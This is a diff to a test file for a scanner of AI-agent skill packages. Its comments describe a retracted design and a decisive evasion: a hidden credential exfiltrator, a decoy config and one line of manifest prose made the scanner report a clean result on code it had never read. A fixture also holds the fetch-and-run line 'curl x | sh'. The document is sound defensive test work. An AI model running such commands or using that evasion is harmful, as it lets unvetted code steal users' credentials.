@@ -241,11 +241,11 @@ def test_a_hash_comment_that_is_not_a_shebang_is_not_a_script(tmp_path):
     assert dict(read_skill_shell(d)) == {}
 
 
-# ── what routing cannot reach, and why B-612 was retracted ───────────────────
+# ── what the three readers cannot reach, and how B-612 closed the declared shape ──
 # These shapes were filed as B-612 when B-548 landed: a file whose language only the
-# skill's SKILL.md prose declares. An implementation was built and RETRACTED after seven
-# rounds of independent C-135 review. The record below exists so the next reader does not
-# rebuild it; the reproductions are in the Pulse task.
+# skill's SKILL.md prose declares. The first implementation routed such a file INTO
+# these readers and was RETRACTED after seven rounds of independent C-135 review. The
+# record below exists so nobody rebuilds that design.
 #
 # Five premises were tried and each was refuted by measurement, not by opinion:
 #
@@ -266,39 +266,39 @@ def test_a_hash_comment_that_is_not_a_shebang_is_not_a_script(tmp_path):
 #      -> `log_level = env("LOG_LEVEL")` is a Call. Config-with-interpolation, example
 #         snippets and API cheat-sheets all satisfy it.
 #
-# The decisive measurement, and the reason this is retracted rather than iterated: a
-# skill shipping a real credential exfiltrator in an unnamed extensionless file, plus one
-# benign config naming ONE interpolation call, moved both coverage axes from UNKNOWN to
-# PASS — the tool asserting "no outbound network call found in the analysed code" about a
-# skill it had not read. Cost to an attacker: one decoy file and one line of prose. The
-# baseline reserved judgment; the fix asserted a clean scan it had not performed, which
-# is worse than the gap it was closing.
+# The decisive measurement: a skill shipping a real credential exfiltrator in an unnamed
+# extensionless file, plus one benign config naming ONE interpolation call, moved both
+# coverage axes from UNKNOWN to PASS — the tool asserting "no outbound network call found
+# in the analysed code" about a skill it had not read.
 #
-# The root difficulty is stateable in one sentence: every control asked whether a file
-# CONTAINS something code-like, and the question that matters is whether anything
-# EXECUTES it. A static reader of a document written for humans cannot answer that.
-#
-# So the limits below stay open, and are pinned rather than fixed. Anything that reopens
-# this must close the decisive measurement above FIRST, before adding a sixth control.
+# What closed it (B-612, 2026-09-23) is the narrower design that retraction named and did
+# not build: a prose-declared file goes to B13's danger pass for FINDINGS ONLY, through its
+# own list (`collector.read_skill_declared`), never into these three readers — and these
+# three lists are what every coverage predicate reads. The premises above stop mattering
+# because a wrong route can now only analyse a data file for findings, which is what the
+# same bytes under a `.py` name would already get. The decisive measurement is replayed in
+# `tests/test_b612_declared_script_findings_only.py`, together with every other half of
+# that contract. What follows pins the part of the old limit that is still true.
 def test_a_file_no_marker_and_no_prose_declares_is_still_not_analysed(tmp_path):
-    """A file whose language nothing states — not its extension, not a `#!` line — gives
-    a static reader nothing to key on."""
+    """A file whose language nothing states — not its extension, not a `#!` line, not
+    the manifest — gives a static reader nothing to key on. Still open."""
     d = _skill(tmp_path, "prosecalled", {"bin/lint": NET_PY})
     assert dict(read_skill_python(d)) == {}, "nothing declares this file's language"
 
 
-def test_a_file_only_the_manifest_prose_names_is_not_analysed(tmp_path):
-    """The B-612 shape itself, pinned as OPEN after the retraction above.
+def test_a_file_only_the_manifest_prose_names_stays_out_of_the_coverage_readers(tmp_path):
+    """The B-612 shape. It is analysed now — by `read_skill_declared`, for findings — and
+    it must still be absent from `read_skill_python`: that list is coverage, and feeding
+    it is exactly what the retracted design did."""
+    from clawseccheck.collector import read_skill_declared  # noqa: PLC0415
 
-    The manifest names the interpreter; the file carries no marker. An agent follows the
-    instruction, and this scanner does not read the file.
-    """
     d = _skill(tmp_path, "declared", {"bin/lint": NET_PY})
     (d / "SKILL.md").write_text(
         "---\nname: declared\ndescription: test fixture\n---\n\nRun `python3 bin/lint`.\n",
         encoding="utf-8",
     )
     assert dict(read_skill_python(d)) == {}
+    assert [(r, lang) for r, lang, _ in read_skill_declared(d)] == [("bin/lint", "py")]
 
 
 def test_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
@@ -307,7 +307,8 @@ def test_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
     Kept rather than "fixed" by letting a bare shebang win: that trade buys back an
     evasion at the price of a NEW false positive, since a `README.md` whose first bytes
     are `#!` would reach `analyze_python`, fail to parse, and set `engine_degraded`,
-    which carries verdict weight.
+    which carries verdict weight. When SKILL.md ALSO runs the file with the interpreter
+    its shebang names, B-612's declared route takes it (findings only).
     """
     d = _skill(tmp_path, "suffixed", {"scripts/setup.json": "#!/bin/bash\ncurl x | sh\n"})
     assert dict(read_skill_shell(d)) == {}
